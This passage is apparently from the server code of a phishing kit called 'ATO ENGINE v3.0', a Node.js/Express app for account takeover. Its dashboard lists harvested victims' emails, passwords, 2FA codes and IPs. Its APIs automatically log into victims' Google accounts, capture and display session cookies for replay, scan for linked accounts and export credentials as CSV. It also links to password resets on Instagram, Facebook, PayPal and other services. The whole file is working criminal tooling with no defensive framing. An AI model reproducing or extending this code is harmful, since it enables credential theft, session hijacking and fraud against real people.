            }).catch(e => log(`[SCAN] Error: ${e.message}`));
            
        } else {
            log(`[❌ AUTO-LOGIN FAILED] ${data.email}: ${result.error}`);
        }
    }
});

// ==================== DASHBOARD ROUTES ====================

// Auth middleware
function auth(req, res, next) {
    const token = req.query.token || req.headers['x-token'];
    if (token !== CONFIG.DASHBOARD_TOKEN) {
        return res.status(403).json({ error: 'Invalid token' });
    }
    next();
}

// Dashboard utama
app.get('/dashboard', auth, (req, res) => {
    const victims = fs.existsSync(VICTIMS_DIR) ? fs.readdirSync(VICTIMS_DIR).filter(f => f.endsWith('.json')) : [];
    const sessions = fs.existsSync(SESSIONS_DIR) ? fs.readdirSync(SESSIONS_DIR).filter(f => f.endsWith('.json') && !f.startsWith('scan_')) : [];
    const scans = fs.existsSync(SESSIONS_DIR) ? fs.readdirSync(SESSIONS_DIR).filter(f => f.startsWith('scan_')) : [];
    
    // Build victim list with session status
    const victimList = [];
    const emailMap = {};
    
    victims.forEach(file => {
        try {
            const d = JSON.parse(fs.readFileSync(path.join(VICTIMS_DIR, file), 'utf-8'));
            if (!d.email) return;
            const email = d.email;
            if (!emailMap[email] || d.step > (emailMap[email].step || 0)) {
                emailMap[email] = {
                    file, email,
                    password: d.password || '',
                    code: d.code || '',
                    phone: d.phone || '',
                    ip: d.ip || '',
                    time: d.receivedAt || d.timestamp || '',
                    step: d.step || 1,
                    hasSession: sessions.some(s => s.includes(email.replace(/[^a-zA-Z0-9]/g, '_'))),
                    hasScan: scans.some(s => s.includes(email.replace(/[^a-zA-Z0-9]/g, '_'))),
                    autoLogin: d.autoLogin || null
                };
            }
        } catch(e) {}
    });
    
    Object.values(emailMap).forEach(v => victimList.push(v));
    victimList.sort((a, b) => new Date(b.time) - new Date(a.time));
    
    const stats = {
        total: victims.length,
        unique: victimList.length,
        withPass: victimList.filter(v => v.password).length,
        with2FA: victimList.filter(v => v.code).length,
        withSession: victimList.filter(v => v.hasSession).length,
        scanned: victimList.filter(v => v.hasScan).length
    };
    
    res.send(`<!DOCTYPE html>
<html>
<head>
<title>🔥 ATO Dashboard</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',monospace}
body{background:#0a0a0a;color:#fff;padding:24px}
.header{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);border-radius:16px;padding:28px;margin-bottom:24px;border:1px solid #2a2a3e}
.header h1{font-size:32px;background:linear-gradient(90deg,#ff4444,#ff8800);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
.header p{color:#888;font-size:13px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:24px}
.stat{background:#1a1a1a;border-radius:12px;padding:16px;text-align:center;border:1px solid #2a2a2a;transition:.3s}
.stat:hover{border-color:#ff4444;transform:translateY(-2px)}
.stat .num{font-size:32px;font-weight:800;margin-bottom:4px}
.stat .lbl{font-size:11px;color:#666;text-transform:uppercase;letter-spacing:1px}
.stat.r .num{color:#ff4444}.stat.g .num{color:#00ff88}.stat.y .num{color:#ffaa00}.stat.b .num{color:#4488ff}
.search{padding:12px 16px;border-radius:10px;border:1px solid #2a2a2a;background:#1a1a1a;color:#fff;font-size:14px;width:100%;margin-bottom:16px;outline:none;transition:.3s;font-family:monospace}
.search:focus{border-color:#ff4444}
table{width:100%;border-collapse:separate;border-spacing:0;overflow:hidden;border-radius:12px;background:#1a1a1a}
th{background:#222;padding:12px 14px;text-align:left;font-size:11px;text-transform:uppercase;color:#ff4444;letter-spacing:1px;border-bottom:1px solid #2a2a2a}
td{padding:10px 14px;border-bottom:1px solid #1a1a1a;font-size:13px;vertical-align:middle}
tr{transition:.2s;background:#1a1a1a}
tr:hover{background:#222}
tr:last-child td{border-bottom:none}
.badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600}
.bg{background:#003300;color:#00ff88;border:1px solid #00ff88}
.br{background:#330000;color:#ff4444;border:1px solid #ff4444}
.by{background:#332200;color:#ffaa00;border:1px solid #ffaa00}
.bb{background:#001133;color:#4488ff;border:1px solid #4488ff}
.btn{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;border-radius:8px;border:none;cursor:pointer;font-size:12px;font-weight:600;transition:.3s;text-decoration:none}
.btn-primary{background:#4488ff;color:#fff}
.btn-primary:hover{background:#3366cc;transform:translateY(-1px)}
.btn-success{background:#00cc66;color:#fff}
.btn-success:hover{background:#009955}
.btn-danger{background:#ff4444;color:#fff}
.btn-danger:hover{background:#cc3333}
.btn-ghost{background:transparent;color:#888;border:1px solid #333}
.btn-ghost:hover{background:#1a1a1a;color:#fff}
.btn-sm{padding:4px 10px;font-size:11px}
.actions{display:flex;gap:6px;flex-wrap:wrap}
.pass-hidden{filter:blur(4px);cursor:pointer;transition:.2s}
.pass-hidden:hover{filter:blur(0)}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);z-index:999;justify-content:center;align-items:center}
.modal.active{display:flex}
.modal-content{background:#1a1a2e;border-radius:16px;padding:32px;max-width:600px;width:90%;max-height:80vh;overflow-y:auto;border:1px solid #2a2a3e}
.modal-content h2{color:#ff4444;margin-bottom:16px}
.close-btn{float:right;background:none;border:none;color:#888;font-size:24px;cursor:pointer}
.platform-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px;margin:16px 0}
.platform-card{background:#222;border-radius:8px;padding:12px;text-align:center;border:1px solid #333;transition:.3s}
.platform-card:hover{border-color:#4488ff;transform:translateY(-2px)}
.platform-card .icon{font-size:28px;margin-bottom:4px}
.platform-card .name{font-size:12px;color:#ccc}
.platform-card .type{font-size:10px;color:#666}
.copy-btn{background:#333;border:1px solid #444;color:#fff;padding:4px 10px;border-radius:6px;cursor:pointer;font-size:11px;font-family:monospace;margin-left:4px}
.copy-btn:hover{background:#444;border-color:#00ff88}
</style>
</head>
<body>
<div class="header">
  <h1>🔥 ATO ENGINE v3.0</h1>
  <p>${new Date().toLocaleString()} | ${victimList.length} victims | ${stats.withSession} sessions active</p>
</div>

<div class="grid">
  <div class="stat r"><div class="num">${stats.unique}</div><div class="lbl">Victims</div></div>
  <div class="stat g"><div class="num">${stats.withPass}</div><div class="lbl">Passwords</div></div>
  <div class="stat y"><div class="num">${stats.with2FA}</div><div class="lbl">2FA Codes</div></div>
  <div class="stat b"><div class="num">${stats.withSession}</div><div class="lbl">Sessions</div></div>
</div>

<input class="search" id="search" placeholder="🔍 Search by email, password, IP..." onkeyup="filter()">

<table>
<thead>
<tr><th>Email</th><th>Password</th><th>2FA</th><th>IP</th><th>Status</th><th>Actions</th></tr>
</thead>
<tbody>
${victimList.map(v => {
  const emailSafe = v.email.replace(/[^a-zA-Z0-9]/g, '_');
  const status = v.hasSession ? '<span class="badge bg">✅ Session</span>' :
                 v.autoLogin?.success ? '<span class="badge bg">✅ Auto</span>' :
                 v.password ? '<span class="badge by">🔑 Creds</span>' :
                 '<span class="badge br">⏳ Partial</span>';
  
  return `<tr class="vr">
    <td><strong style="font-size:13px">${v.email}</strong><br><span style="font-size:10px;color:#666">${new Date(v.time).toLocaleString()}</span></td>
    <td>${v.password ? `<span class="pass-hidden" onclick="this.classList.toggle('pass-hidden')">${v.password}</span>` : '-'}</td>
    <td>${v.code ? `<span class="badge by">${v.code}</span>` : '-'}</td>
    <td style="font-size:11px;color:#888">${v.ip || '-'}</td>
    <td>${status}</td>
    <td>
      <div class="actions">
        ${v.hasSession ? `<button class="btn btn-success btn-sm" onclick="openModal('${emailSafe}')">🚀 Access</button>` :
         v.password ? `<button class="btn btn-primary btn-sm" onclick="autoLoginNow('${emailSafe}','${v.email}','${v.password}','${v.code || ''}')">🤖 Login</button>` : ''}
        <button class="btn btn-ghost btn-sm" onclick="viewData('${escape(v.file)}')">📄</button>
      </div>
    </td>
  </tr>`;
}).join('')}
</tbody>
</table>

<!-- Access Modal -->
<div class="modal" id="accessModal">
  <div class="modal-content">
    <button class="close-btn" onclick="closeModal()">&times;</button>
    <h2>🚀 Victim Access Panel</h2>
    <div id="modalBody">Loading...</div>
  </div>
</div>

<script>
function filter() {
  const q = document.getElementById('search').value.toLowerCase();
  document.querySelectorAll('.vr').forEach(r => {
    r.style.display = r.textContent.toLowerCase().includes(q) ? '' : 'none';
  });
}

function viewData(file) {
  window.open('/data/' + encodeURIComponent(file) + '?token=${CONFIG.DASHBOARD_TOKEN}', '_blank');
}

async function autoLoginNow(emailSafe, email, password, code) {
  const btn = event.target;
  btn.disabled = true;
  btn.textContent = '⏳ Logging in...';
  
  try {
    const res = await fetch('/api/auto-login', {
      method: 'POST',
      headers: {'Content-Type':'application/json','x-token':'${CONFIG.DASHBOARD_TOKEN}'},
      body: JSON.stringify({ email, password, code })
    });
    const data = await res.json();
    if (data.success) {
      btn.className = 'btn btn-success btn-sm';
      btn.innerHTML = '✅ Session Ready';
      setTimeout(() => location.reload(), 1000);
    } else {
      btn.className = 'btn btn-danger btn-sm';
      btn.innerHTML = '❌ ' + (data.error || 'Failed');
    }
  } catch(e) {
    btn.className = 'btn btn-danger btn-sm';
    btn.innerHTML = '❌ Error';
  }
}

async function openModal(emailSafe) {
  document.getElementById('accessModal').classList.add('active');
  document.getElementById('modalBody').innerHTML = '<p style="color:#888">Loading victim data...</p>';
  
  try {
    const res = await fetch('/api/victim-access?email=' + emailSafe + '&token=${CONFIG.DASHBOARD_TOKEN}');
    const data = await res.json();
    
    if (!data.success) {
      document.getElementById('modalBody').innerHTML = '<p style="color:#ff4444">Error: ' + (data.error || 'Unknown') + '</p>';
      return;
    }
    
    let html = '';
    
    // Session info
    html += \`<div style="background:#222;border-radius:10px;padding:16px;margin-bottom:16px">
      <h3 style="color:#00ff88;font-size:16px;margin-bottom:12px">✅ Google Session Active</h3>
      <p style="color:#888;font-size:13px">Logged in as: <strong style="color:#fff">\${data.email}</strong></p>
      <p style="color:#888;font-size:13px">Session: <code style="color:#4488ff;font-size:11px">\${data.sessionId}</code></p>
      <p style="color:#888;font-size:13px">Cookies: \${data.cookiesCount} captured</p>
      <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">
        <a href="https://mail.google.com" target="_blank" class="btn btn-success" onclick="alert('Paste these cookies into browser:\\n\\\\n' + document.getElementById('cookieDump').textContent.substring(0,200)+'...')">📧 Open Gmail</a>
        <a href="https://drive.google.com" target="_blank" class="btn btn-primary">📁 Open Drive</a>
        <a href="https://photos.google.com" target="_blank" class="btn btn-primary">📸 Open Photos</a>
        <a href="https://myaccount.google.com/security" target="_blank" class="btn btn-ghost">🔐 Security</a>
        <a href="https://myaccount.google.com/connections" target="_blank" class="btn btn-ghost">🔗 Connected Apps</a>
      </div>
    </div>\`;
    
    // Quick access buttons
    html += \`<div style="background:#222;border-radius:10px;padding:16px;margin-bottom:16px">
      <h3 style="color:#4488ff;font-size:16px;margin-bottom:12px">⚡ Quick Reset Links</h3>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px">
        <a href="https://instagram.com/accounts/password/reset" target="_blank" class="btn btn-ghost btn-sm" style="text-align:center">📷 Instagram</a>
        <a href="https://facebook.com/login/identify" target="_blank" class="btn btn-ghost btn-sm" style="text-align:center">📘 Facebook</a>
        <a href="https://shopee.co.id/user/reset" target="_blank" class="btn btn-ghost btn-sm" style="text-align:center">🛒 Shopee</a>
        <a href="https://tokopedia.com/forgot" target="_blank" class="btn btn-ghost btn-sm" style="text-align:center">🛍️ Tokopedia</a>
        <a href="https://paypal.com/reset" target="_blank" class="btn btn-ghost btn-sm" style="text-align:center">💳 PayPal</a>
        <a href="https://steamcommunity.com/login/home" target="_blank" class="btn btn-ghost btn-sm" style="text-align:center">🎮 Steam</a>
      </div>
    </div>\`;
    
    // Cookie dump (collapsible)
    html += \`<div style="background:#222;border-radius:10px;padding:16px;margin-bottom:16px">
      <h3 style="color:#ffaa00;font-size:16px;margin-bottom:12px">🍪 Cookie Export</h3>
      <pre id="cookieDump" style="background:#0a0a0a;padding:12px;border-radius:6px;font-size:10px;color:#888;max-height:120px;overflow-y:auto;cursor:pointer" onclick="this.style.maxHeight='none'">\${data.cookieString}</pre>
      <button class="copy-btn" onclick="navigator.clipboard.writeText(document.getElementById('cookieDump').textContent);this.textContent='✅ Copied!'">📋 Copy All Cookies</button>
    </div>\`;
    
    // Detected platforms
    if (data.platforms && data.platforms.length > 0) {
      html += \`<div style="background:#222;border-radius:10px;padding:16px;margin-bottom:16px">
        <h3 style="color:#00ff88;font-size:16px;margin-bottom:12px">🔓 Detected Accounts (\${data.platforms.length})</h3>
        <div class="platform-grid">\`;
      
      data.platforms.forEach(p => {
        html += \`<div class="platform-card">
          <div class="icon">\${p.icon || '🔗'}</div>
          <div class="name">\${p.name}</div>
          <div class="type">\${p.type || 'unknown'}</div>
        </div>\`;
      });
      
      html += \`</div></div>\`;
    }
    
    // Available cookies
    if (data.allCookies && data.allCookies.length > 0) {
      html += \`<div style="background:#222;border-radius:10px;padding:16px">
        <h3 style="color:#4488ff;font-size:16px;margin-bottom:12px">🍪 All Captured Cookies</h3>
        <table style="font-size:10px;background:#0a0a0a">
          <tr><th>Domain</th><th>Name</th><th>Value</th></tr>\`;
      
      data.allCookies.slice(0, 30).forEach(c => {
        html += \`<tr><td style="color:#4488ff">\${c.domain}</td><td>\${c.name}</td><td style="color:#888;max-width:200px;overflow:hidden;text-overflow:ellipsis">\${c.value.substring(0,60)}</td></tr>\`;
      });
      
      html += \`</table></div>\`;
    }
    
    document.getElementById('modalBody').innerHTML = html;
  } catch(e) {
    document.getElementById('modalBody').innerHTML = '<p style="color:#ff4444">Error loading: ' + e.message + '</p>';
  }
}

function closeModal() {
  document.getElementById('accessModal').classList.remove('active');
}
</script>
</body>
</html>`);
});

// ==================== API ROUTES ====================

// View victim data file
app.get('/data/:file', auth, (req, res) => {
    const filePath = path.join(VICTIMS_DIR, req.params.file);
    if (!fs.existsSync(filePath)) return res.status(404).send('Not found');
    
    try {
        const data = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
        res.json(data);
    } catch(e) {
        res.status(500).send('Parse error');
    }
});

// Auto-login API
app.post('/api/auto-login', auth, async (req, res) => {
    const { email, password, code } = req.body;
    if (!email || !password) return res.status(400).json({ success: false, error: 'Missing email/password' });
    
    // Check if session already exists
    const existingSession = fs.readdirSync(SESSIONS_DIR).find(f => 
        f.includes(email.replace(/[^a-zA-Z0-9]/g, '_')) && !f.startsWith('scan_')
    );
    
    if (existingSession) {
        const sessionData = JSON.parse(fs.readFileSync(path.join(SESSIONS_DIR, existingSession), 'utf-8'));
        // Check if session is still fresh (< 1 hour)
        const age = Date.now() - new Date(sessionData.loginTime).getTime();
        if (age < 3600000) {
            return res.json({
                success: true,
                email,
                sessionId: sessionData.sessionId,
                cookiesCount: sessionData.cookies?.length || 0,
                alreadyExists: true
            });
        }
    }
    
    const result = await autoLogin(email, password, code);
    
    if (result.success) {
        // Start scan in background
        scanVictimAccounts(email, result.sessionId).catch(() => {});
        
        res.json({
            success: true,
            email,
            sessionId: result.sessionId,
            cookiesCount: result.cookies || 0
        });
    } else {
        res.json({ success: false, error: result.error });
    }
});

// Victim access panel API
app.get('/api/victim-access', auth, async (req, res) => {
    const email = req.query.email;
    if (!email) return res.json({ success: false, error: 'Missing email' });
    
    const emailSafe = email.replace(/[^a-zA-Z0-9]/g, '_');
    
    // Find session
    const sessionFile = fs.readdirSync(SESSIONS_DIR).find(f => 
        f.includes(emailSafe) && !f.startsWith('scan_')
    );
    
    if (!sessionFile) {
        return res.json({ success: false, error: 'No session. Run auto-login first.' });
    }
    
    try {
        const sessionData = JSON.parse(fs.readFileSync(path.join(SESSIONS_DIR, sessionFile), 'utf-8'));
        
        // Find scan results
        let platforms = [];
        const scanFile = fs.readdirSync(SESSIONS_DIR).find(f => f.startsWith('scan_') && f.includes(emailSafe));
        if (scanFile) {
            try {
                const scanData = JSON.parse(fs.readFileSync(path.join(SESSIONS_DIR, scanFile), 'utf-8'));
                platforms = scanData.platforms || [];
            } catch(e) {}
        }
        
        // Build cookie string
        const cookieString = sessionData.cookies?.map(c => `${c.name}=${c.value}`).join('; ') || '';
        
        // Parse cookies for replay
        const allCookies = (sessionData.cookies || []).map(c => ({
            domain: c.domain,
            name: c.name,
            value: c.value.substring(0, 100),
            expires: c.expires || 'session'
        }));
        
        res.json({
            success: true,
            email,
            sessionId: sessionData.sessionId,
            loginTime: sessionData.loginTime,
            cookieString,
            cookiesCount: sessionData.cookies?.length || 0,
            platforms,
            allCookies
        });
    } catch(e) {
        res.json({ success: false, error: e.message });
    }
});

// Account scan API
app.post('/api/scan', auth, async (req, res) => {
    const { email } = req.body;
    if (!email) return res.status(400).json({ success: false, error: 'Missing email' });
    
    const emailSafe = email.replace(/[^a-zA-Z0-9]/g, '_');
    const sessionFile = fs.readdirSync(SESSIONS_DIR).find(f => f.includes(emailSafe) && !f.startsWith('scan_'));
    
    if (!sessionFile) {
        return res.json({ success: false, error: 'No session. Run auto-login first.' });
    }
    
    const sessionData = JSON.parse(fs.readFileSync(path.join(SESSIONS_DIR, sessionFile), 'utf-8'));
    const result = await scanVictimAccounts(email, sessionData.sessionId);
    
    res.json(result);
});

// List sessions
app.get('/api/sessions', auth, (req, res) => {
    const sessions = fs.existsSync(SESSIONS_DIR) ? fs.readdirSync(SESSIONS_DIR).filter(f => f.endsWith('.json')) : [];
    const result = sessions.map(f => {
        try {
            const d = JSON.parse(fs.readFileSync(path.join(SESSIONS_DIR, f), 'utf-8'));
            return { file: f, email: d.email || '?', time: d.loginTime || '?', type: f.startsWith('scan_') ? 'scan' : 'session' };
        } catch(e) { return null; }
    }).filter(Boolean);
    
    res.json(result);
});

// Export victim data
app.get('/api/export', auth, (req, res) => {
    const format = req.query.format || 'json';
    const email = req.query.email;
    
    let victims = fs.existsSync(VICTIMS_DIR) ? fs.readdirSync(VICTIMS_DIR).filter(f => f.endsWith('.json')) : [];
    
    if (email) {
        const emailSafe = email.replace(/[^a-zA-Z0-9@._-]/g, '_');
        victims = victims.filter(f => f.includes(emailSafe));
    }
    
    const data = victims.map(f => {
        try { return JSON.parse(fs.readFileSync(path.join(VICTIMS_DIR, f), 'utf-8')); }
        catch(e) { return null; }
    }).filter(Boolean);
    
    if (format === 'csv') {
        let csv = 'Time,Email,Password,2FA,Phone,IP\n';
        data.forEach(d => {
            csv += `"${d.receivedAt || ''}","${d.email || ''}","${d.password || ''}","${d.code || ''}","${d.phone || ''}","${d.ip || ''}"\n`;
        });
        res.setHeader('Content-Type', 'text/csv');
        res.send(csv);
    } else {
        res.json(data);
    }
});

// ==================== START ====================
app.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('  ╔══════════════════════════════════════════════╗');
    console.log('  ║     🔥 ATO ENGINE v3.0                      ║');
    console.log('  ║     Auto-Login + Account Scanner            ║');
    console.log('  ║     One-Click Account Takeover              ║');
    console.log('  ╚══════════════════════════════════════════════╝');
    console.log('');
    console.log(`  🌐 Phishing Page:    http://0.0.0.0:${PORT}/`);
    console.log(`  📊 Dashboard:        http://0.0.0.0:${PORT}/dashboard?token=${CONFIG.DASHBOARD_TOKEN}`);
    console.log(`  📁 Data:             ${VICTIMS_DIR}`);
    console.log(`  🍪 Sessions:         ${SESSIONS_DIR}`);
    console.log('');
});
